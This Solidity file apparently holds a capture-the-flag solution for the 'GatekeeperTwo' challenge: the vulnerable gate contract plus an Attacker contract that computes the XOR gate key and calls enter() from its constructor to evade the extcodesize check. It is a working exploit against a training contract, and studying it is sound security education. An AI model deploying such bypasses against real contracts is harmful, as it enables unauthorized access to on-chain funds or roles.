// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attacker {
  constructor(address _addr) public {
    bytes8 _gateKey = bytes8(
      uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)
    );
    _addr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
  }
}

contract GatekeeperTwo {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint256 x;
    assembly {
      x := extcodesize(caller())
    }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(
      uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
    );
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}